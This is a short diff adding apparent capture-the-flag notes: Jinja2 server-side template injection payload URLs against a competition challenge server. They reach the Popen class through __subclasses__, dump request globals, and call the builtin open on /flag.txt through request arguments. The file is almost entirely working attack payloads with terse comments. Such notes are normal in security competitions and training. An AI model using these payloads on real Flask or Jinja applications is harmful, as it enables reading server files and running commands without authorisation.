@@ -1,0 +1,8 @@
+# Popen
+http://chal.pctf.competitivecyber.club:5555/%7B%7Bdict.__mro__.__getitem__(1).__subclasses__().__getitem__(455)%7D%7D
+
+# List a bunch of globasl (open function is here)
+http://chal.pctf.competitivecyber.club:5555/%7B%7Brequest.__class__._load_form_data.__globals__%7D%7D
+
+# did with requests
+chal.pctf.competitivecyber.club:5555/{{request.__class__._load_form_data.__globals__.__getitem__(request.args.a).__getitem__(request.args.b)(request.args.f).read()}}?a=__builtins__&b=open&f=/flag.txt
